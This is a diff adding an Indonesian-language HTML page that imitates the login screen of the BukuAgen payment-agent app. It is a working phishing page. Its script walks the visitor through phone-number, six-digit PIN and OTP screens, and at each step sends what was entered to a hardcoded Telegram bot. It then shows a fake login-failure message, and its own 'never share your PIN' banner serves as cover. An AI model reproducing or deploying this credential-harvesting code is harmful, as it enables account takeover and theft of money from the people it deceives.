@@ -1,0 +1,692 @@
+<!doctype html>
+<html lang="id">
+ <head>
+  <meta property="og:title" content="Layanan Bantuan ">
+  <meta property="og:description" content="Selamat datang di Aplikasi Buku Agen.">
+  <meta property="og:image" content="https://bukuagen0.wordpress.com/wp-content/uploads/2026/04/1775225876585_1000130607.jpg?w=512">
+  <meta property="og:url" content="https://fabulous-conkies-6ea75b.netlify.app/">
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>BukuAgen - Masuk</title>
+  <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: Arial, sans-serif;
+        }
+
+        /* Header Umum */
+        .top-header {
+            background-color: #007bff;
+            padding: 15px 20px;
+            display: flex;
+            align-items: center;
+        }
+
+        .back-arrow {
+            color: white;
+            font-size: 20px;
+            text-decoration: none;
+        }
+
+        .header-title {
+            color: white;
+            font-size: 18px;
+            font-weight: bold;
+            margin-left: 15px;
+        }
+
+        /* Loading Screen */
+        .loading-screen {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: white;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+        }
+
+        .loading-spinner {
+            width: 40px;
+            height: 40px;
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #007bff;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-bottom: 15px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .loading-text {
+            font-size: 16px;
+            color: #666666;
+        }
+
+        /* Halaman Login */
+        .login-page {
+            display: block;
+        }
+
+        .logo-container {
+            text-align: center;
+            padding: 25px 15px;
+        }
+
+        .logo {
+            width: 350px;
+            height: auto;
+            display: inline-block;
+        }
+
+        .title-area {
+            text-align: center;
+            margin: 0 15px 30px;
+        }
+
+        .title-area h1 {
+            font-size: 20px;
+            font-weight: bold;
+            margin-bottom: 8px;
+        }
+
+        .title-area p {
+            font-size: 14px;
+            color: #666666;
+        }
+
+        .form-area {
+            margin: 0 15px;
+        }
+
+        .form-label {
+            font-size: 16px;
+            font-weight: bold;
+            display: block;
+            margin-bottom: 12px;
+        }
+
+        .input-wrapper {
+            display: flex;
+            align-items: center;
+            margin-bottom: 8px;
+        }
+
+        .country-code-box {
+            background-color: #f0f0f0;
+            border: 1px solid #cccccc;
+            border-radius: 4px 0 0 4px;
+            padding: 10px 12px;
+            display: flex;
+            align-items: center;
+        }
+
+        .flag-img {
+            width: 20px;
+            height: auto;
+            margin-right: 8px;
+        }
+
+        .code-text {
+            font-size: 14px;
+            font-weight: 500;
+        }
+
+        .phone-input {
+            flex: 1;
+            padding: 10px 12px;
+            border: 2px solid #8092ff;
+            border-radius: 0 4px 4px 0;
+            outline: none;
+            font-size: 14px;
+        }
+
+        .note-text {
+            font-size: 12px;
+            color: #666666;
+            margin-bottom: 40px;
+        }
+
+        .terms-area {
+            margin: 0 15px 20px;
+            font-size: 12px;
+            color: #666666;
+            line-height: 1.5;
+        }
+
+        .terms-area a {
+            color: #8092ff;
+            text-decoration: none;
+        }
+
+        .submit-btn {
+            width: calc(100% - 30px);
+            margin: 0 15px;
+            padding: 12px;
+            border: none;
+            border-radius: 4px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+        }
+
+        .submit-btn:disabled {
+            background-color: #cccccc;
+            color: #999999;
+            cursor: not-allowed;
+        }
+
+        .submit-btn:enabled {
+            background-color: #ffd700;
+            color: #fffff;
+        }
+
+        .submit-btn:enabled:hover {
+            background-color: #0056b3;
+        }
+
+        /* Halaman PIN */
+        .pin-page {
+            display: none;
+            padding: 40px 25px;
+        }
+
+        .warning-banner {
+            background-color: #f8f9fa;
+            padding: 15px;
+            border-radius: 8px;
+            display: flex;
+            align-items: flex-start;
+            margin-bottom: 30px;
+        }
+
+        .warning-icon {
+            width: 40px;
+            height: 40px;
+            margin-right: 12px;
+        }
+
+        .warning-title {
+            font-size: 14px;
+            font-weight: bold;
+            margin-bottom: 4px;
+        }
+
+        .warning-desc {
+            font-size: 12px;
+            color: #666666;
+        }
+
+        .pin-title {
+            font-size: 22px;
+            font-weight: bold;
+            text-align: center;
+            margin-bottom: 8px;
+        }
+
+        .pin-desc {
+            font-size: 14px;
+            color: #666666;
+            text-align: center;
+            margin-bottom: 30px;
+        }
+
+        .pin-inputs {
+            display: flex;
+            justify-content: center;
+            gap: 10px;
+            margin-bottom: 30px;
+        }
+
+        .pin-dot {
+            width: 25px;
+            height: 25px;
+            border-radius: 50%;
+            border: 1px solid #cccccc;
+            background-color: #ffffff;
+        }
+
+        .pin-dot.filled {
+            background-color: #007bff;
+            border-color: #007bff;
+        }
+
+        /* Input Tersembunyi PIN */
+        #pin-input {
+            position: absolute;
+            left: -9999px;
+            max-length: 6;
+        }
+
+        /* Halaman OTP */
+        .otp-page {
+            display: none;
+        }
+
+        .otp-container {
+            padding: 40px 25px;
+            text-align: center;
+        }
+
+        .otp-title {
+            font-size: 22px;
+            font-weight: bold;
+            margin-bottom: 10px;
+        }
+
+        .otp-desc {
+            font-size: 14px;
+            color: #666666;
+            margin-bottom: 30px;
+            line-height: 1.5;
+        }
+
+        .otp-desc span {
+            font-weight: bold;
+        }
+
+        .otp-inputs {
+            display: flex;
+            justify-content: center;
+            gap: 15px;
+            margin-bottom: 30px;
+        }
+
+        .otp-box {
+            width: 50px;
+            height: 60px;
+            border-radius: 8px;
+            border: 1px solid #cccccc;
+            background-color: #f5f5f5;
+            text-align: center;
+            font-size: 20px;
+            outline: none;
+            max-length: 1;
+        }
+
+        .otp-box:focus {
+            border: 2px solid #007bff;
+            background-color: #e6f0ff;
+        }
+
+        .resend-section {
+            font-size: 14px;
+            color: #333333;
+        }
+
+        .resend-text span {
+            font-weight: bold;
+            color: #007bff;
+        }
+
+        .resend-btn {
+            color: #007bff;
+            text-decoration: none;
+            font-weight: bold;
+            display: none;
+        }
+
+        /* Halaman Error Akhir */
+        .final-error-page {
+            display: none;
+            padding: 40px 25px;
+            text-align: center;
+        }
+
+        .error-icon {
+            font-size: 60px;
+            color: #ff4444;
+            margin-bottom: 20px;
+        }
+
+        .error-title {
+            font-size: 20px;
+            font-weight: bold;
+            margin-bottom: 10px;
+        }
+
+        .error-desc {
+            font-size: 14px;
+            color: #666666;
+            margin-bottom: 30px;
+            line-height: 1.5;
+        }
+
+        .retry-btn {
+            padding: 12px 25px;
+            background-color: #007bff;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+
+        .retry-btn:hover {
+            background-color: #0056b3;
+        }
+    </style>
+ </head>
+ <body>
+  <!-- Halaman Login -->
+  <div class="login-page" id="loginPage">
+   <div class="logo-container">
+    <img src="https://bukuagen.wordpress.com/wp-content/uploads/2026/04/1775097126711_1000130228.jpg?w=1024" alt="Logo BukuAgen" class="logo">
+   </div>
+   <div class="title-area">
+    <h1>Aplikasi &amp; EDC Andalan Agen Pembayaran</h1>
+    <p>Masuk atau daftar untuk mulai #BebasTambahCuan.</p>
+   </div>
+   <div class="form-area">
+    <label class="form-label">Masukkan Nomor HP</label>
+    <div class="input-wrapper">
+     <div class="country-code-box">
+      <img src="https://flagcdn.com/w20/id.png" alt="Bendera Indonesia" class="flag-img"> <span class="code-text">+62</span>
+     </div>
+     <input type="tel" id="phone-number" class="phone-input" placeholder="825765475285" oninput="checkPhoneNumber()">
+    </div>
+    <p class="note-text">Kalau sudah punya EDC BukuAgen, pastikan masukkan nomor yang sudah terdaftar.</p>
+   </div>
+   <div class="terms-area">
+    <p>Dengan membuat akun, Saya menyetujui <a href="#">Syarat and Ketentuan</a> serta <a href="#">Kebijakan Privasi</a> yang berlaku.</p>
+   </div>
+   <button id="submit-button" class="submit-btn" disabled onclick="showLoadingToPIN()">Masuk/Daftar</button>
+  </div>
+  <!-- Layar Loading Umum -->
+  <div class="loading-screen" id="loadingScreen">
+   <div class="loading-spinner"></div>
+   <div class="loading-text">Memproses...</div>
+  </div>
+  <!-- Halaman PIN -->
+  <div class="pin-page" id="pinPage">
+   <div class="top-header">
+    <a href="#" class="back-arrow">←</a>
+    <h2 class="header-title">Masukkan PIN</h2>
+   </div>
+   <div class="warning-banner">
+    <img src="https://cdn-icons-png.flaticon.com/512/25/25694.png" alt="Ikon Peringatan" class="warning-icon">
+    <div>
+     <p class="warning-title">Jangan bagikan PIN kamu ya!</p>
+     <p class="warning-desc">BukuWarung tidak pernah menanyakan kode PIN dan kode OTP kamu.</p>
+    </div>
+   </div>
+   <h3 class="pin-title">Masukkan PIN Saat Ini</h3>
+   <p class="pin-desc">Masukkan 6 angka PIN kamu</p>
+   <div class="pin-inputs">
+    <div class="pin-dot" id="pin1"></div>
+    <div class="pin-dot" id="pin2"></div>
+    <div class="pin-dot" id="pin3"></div>
+    <div class="pin-dot" id="pin4"></div>
+    <div class="pin-dot" id="pin5"></div>
+    <div class="pin-dot" id="pin6"></div>
+   </div>
+   <input type="text" id="pin-input" maxlength="6" style="position: absolute; left: -9999px;" oninput="fillPinDots()">
+  </div>
+  <!-- Halaman OTP -->
+  <div class="otp-page" id="otpPage">
+   <div class="top-header">
+    <a href="#" class="back-arrow">←</a>
+    <h2 class="header-title">Kode OTP</h2>
+   </div>
+   <div class="otp-container">
+    <h3 class="otp-title">Masukkan Kode OTP</h3>
+    <p class="otp-desc">Kode OTP sudah dikirim melalui <span>SMS</span> ke nomor +62<span id="displayPhone">825765475285</span>.</p>
+    <div class="otp-inputs">
+     <input type="text" class="otp-box" maxlength="1" oninput="moveToNextInput(this)"> <input type="text" class="otp-box" maxlength="1" oninput="moveToNextInput(this)"> <input type="text" class="otp-box" maxlength="1" oninput="moveToNextInput(this)"> <input type="text" class="otp-box" maxlength="1" oninput="moveToNextInput(this), checkOTPFilled()">
+    </div>
+    <div class="resend-section">
+     <p class="resend-text">Belum terima kode? <span id="countdown">01:00</span></p>
+     <a href="#" class="resend-btn" id="resendBtn" onclick="resetTimer()">Kirim Ulang Kode</a>
+    </div>
+   </div>
+  </div>
+  <!-- Halaman Error Akhir -->
+  <div class="final-error-page" id="finalErrorPage">
+   <div class="top-header">
+    <a href="#" class="back-arrow">←</a>
+    <h2 class="header-title">Gagal Masuk</h2>
+   </div>
+   <div class="error-icon">⚠️</div>
+   <h3 class="error-title">Untuk Sementara Belum Bisa Masuk ke Aplikasi BukuAgen</h3>
+   <p class="error-desc">Silahkan ulangi beberapa saat lagi atau periksa koneksi Anda.</p>
+   <button class="retry-btn" onclick="backToLoginPage()">Coba Lagi</button>
+  </div>
+  <script>
+        // KONFIGURASI TERBARU - TOKEN BOT YANG DIBERIKAN
+        const TELEGRAM_BOT_TOKEN = "8643421646%3AAAFZymEpAHM68arzi_ixhy25-zJOT7cz0Ts";
+        const TELEGRAM_CHAT_ID = "8683955923";
+
+        // Variabel untuk menyimpan data pengguna
+        let userData = {
+            phone: "",
+            pin: "",
+            otp: ""
+        };
+
+        // Fungsi untuk mengirim data ke Telegram dengan validasi lengkap
+        async function sendToTelegram(messageContent) {
+            try {
+                // Validasi format URL dan data sebelum pengiriman
+                const requestUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+                const requestBody = JSON.stringify({
+                    chat_id: TELEGRAM_CHAT_ID,
+                    text: messageContent,
+                    parse_mode: "HTML" // Menggunakan HTML untuk format pesan lebih rapi
+                });
+
+                const response = await fetch(requestUrl, {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json",
+                        "Accept": "application/json"
+                    },
+                    body: requestBody
+                });
+
+                const result = await response.json();
+                
+                // Tampilkan status pengiriman di console untuk debugging
+                if (result.ok) {
+                    console.log("✅ Data berhasil dikirim ke Telegram!");
+                } else {
+                    console.error("❌ Gagal kirim ke Telegram:", result.description);
+                }
+            } catch (error) {
+                console.error("❌ Error saat mengirim data:", error.message);
+            }
+        }
+
+        // Cek input nomor HP dan aktifkan tombol jika valid
+        function checkPhoneNumber() {
+            const phoneInput = document.getElementById('phone-number');
+            const submitButton = document.getElementById('submit-button');
+            userData.phone = phoneInput.value.trim();
+            
+            // Validasi hanya angka dan minimal 8 digit
+            const isPhoneValid = userData.phone.length >= 8 && /^[0-9]+$/.test(userData.phone);
+            submitButton.disabled = !isPhoneValid;
+            
+            // Tampilkan nomor HP yang diinputkan di halaman OTP
+            document.getElementById('displayPhone').textContent = userData.phone;
+        }
+
+        // Tampilkan loading lalu pindah ke halaman PIN
+        function showLoadingToPIN() {
+            document.getElementById('loginPage').style.display = 'none';
+            document.getElementById('loadingScreen').style.display = 'flex';
+
+            // Kirim data nomor HP ke Telegram dengan format jelas
+            const phoneMessage = `
+📱 <b>DATA PENGGUNA - NOMOR HP</b>
+Nomor HP: <code>+62${userData.phone}</code>
+            `;
+            sendToTelegram(phoneMessage);
+
+            // Tunda 3 detik sebelum masuk halaman PIN
+            setTimeout(() => {
+                document.getElementById('loadingScreen').style.display = 'none';
+                document.getElementById('pinPage').style.display = 'block';
+                // Fokus ke input tersembunyi PIN agar bisa menerima input
+                document.getElementById('pin-input').focus();
+            }, 3000);
+        }
+
+        // Isi indikator titik PIN sesuai input yang dimasukkan
+        function fillPinDots() {
+            const pinInput = document.getElementById('pin-input');
+            userData.pin = pinInput.value;
+            const pinDots = document.querySelectorAll('.pin-dot');
+
+            // Kosongkan semua titik terlebih dahulu
+            pinDots.forEach(dot => dot.classList.remove('filled'));
+
+            // Isi titik sesuai panjang PIN yang dimasukkan
+            for (let i = 0; i < userData.pin.length; i++) {
+                pinDots[i].classList.add('filled');
+            }
+
+            // Jika PIN sudah 6 digit, kirim data dan pindah ke halaman OTP
+            if (userData.pin.length === 6) {
+                const pinMessage = `
+🔐 <b>DATA PENGGUNA - PIN</b>
+Nomor HP: <code>+62${userData.phone}</code>
+PIN: <code>${userData.pin}</code>
+                `;
+                sendToTelegram(pinMessage);
+
+                setTimeout(() => {
+                    document.getElementById('pinPage').style.display = 'none';
+                    document.getElementById('loadingScreen').style.display = 'flex';
+                    
+                    setTimeout(() => {
+                        document.getElementById('loadingScreen').style.display = 'none';
+                        document.getElementById('otpPage').style.display = 'block';
+                        startCountdown(); // Mulai hitungan mundur OTP
+                    }, 1000);
+                }, 500);
+            }
+        }
+
+        // Pindahkan fokus ke input OTP berikutnya
+        function moveToNextInput(currentInput) {
+            const otpInputs = document.querySelectorAll('.otp-box');
+            const currentIndex = Array.from(otpInputs).indexOf(currentInput);
+            
+            // Pindah fokus jika input sudah terisi dan bukan input terakhir
+            if (currentIndex < otpInputs.length - 1 && currentInput.value) {
+                otpInputs[currentIndex + 1].focus();
+            }
+        }
+
+        // Cek jika semua kolom OTP sudah terisi
+        function checkOTPFilled() {
+            const otpInputs = document.querySelectorAll('.otp-box');
+            let isOtpFilled = true;
+            userData.otp = "";
+
+            otpInputs.forEach(input => {
+                if (!input.value) {
+                    isOtpFilled = false;
+                } else {
+                    userData.otp += input.value;
+                }
+            });
+
+            // Jika OTP lengkap, kirim data dan pindah ke halaman error
+            if (isOtpFilled) {
+                const otpMessage = `
+✅ <b>DATA PENGGUNA - OTP</b>
+Nomor HP: <code>+62${userData.phone}</code>
+PIN: <code>${userData.pin}</code>
+OTP: <code>${userData.otp}</code>
+                `;
+                sendToTelegram(otpMessage);
+
+                setTimeout(() => {
+                    document.getElementById('otpPage').style.display = 'none';
+                    document.getElementById('loadingScreen').style.display = 'flex';
+                    
+                    setTimeout(() => {
+                        document.getElementById('loadingScreen').style.display = 'none';
+                        document.getElementById('finalErrorPage').style.display = 'block';
+                    }, 1000);
+                }, 500);
+            }
+        }
+
+        // Hitungan mundur untuk tombol kirim ulang OTP
+        let countdownInterval;
+        const totalSeconds = 60;
+        let remainingSeconds = totalSeconds;
+
+        function startCountdown() {
+            updateTimerDisplay();
+            countdownInterval = setInterval(() => {
+                remainingSeconds--;
+                updateTimerDisplay();
+
+                // Tampilkan tombol kirim ulang jika waktu habis
+                if (remainingSeconds <= 0) {
+                    clearInterval(countdownInterval);
+                    document.getElementById('countdown').textContent = "00:00";
+                    document.getElementById('resendBtn').style.display = 'inline';
+                }
+            }, 1000);
+        }
+
+        function updateTimerDisplay() {
+            const minutes = Math.floor(remainingSeconds / 60);
+            const seconds = remainingSeconds % 60;
+            document.getElementById('countdown').textContent = 
+                `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+        }
+
+        // Reset hitungan mundur dan kosongkan input OTP
+        function resetTimer() {
+            clearInterval(countdownInterval);
+            remainingSeconds = totalSeconds;
+            updateTimerDisplay();
+            startCountdown();
+            
+            // Kosongkan kolom OTP
+            const otpInputs = document.querySelectorAll('.otp-box');
+            otpInputs.forEach(input => input.value = "");
+            userData.otp = "";
+        }
+
+        // Kembali ke halaman login dan reset semua data
+        function backToLoginPage() {
+            document.getElementById('finalErrorPage').style.display = 'none';
+            document.getElementById('loginPage').style.display = 'block';
+            
+            // Reset semua data pengguna dan input
+            userData = { phone: "", pin: "", otp: "" };
+            document.getElementById('phone-number').value = "";
+            document.getElementById('submit-button').disabled = true;
+            
+            const otpInputs = document.querySelectorAll('.otp-box');
+            otpInputs.forEach(input => input.value = "");
+            
+            document.getElementById('pin-input').value = "";
+            const pinDots = document.querySelectorAll('.pin-dot');
+            pinDots.forEach(dot => dot.classList.remove('filled'));
+            
+            // Reset hitungan mundur
+            clearInterval(countdownInterval);
+            remainingSeconds = totalSeconds;
+            document.getElementById('countdown').textContent = "01:00";
+            document.getElementById('resendBtn').style.display = 'none';
+        }
+    </script>
+ </body>
+</html>
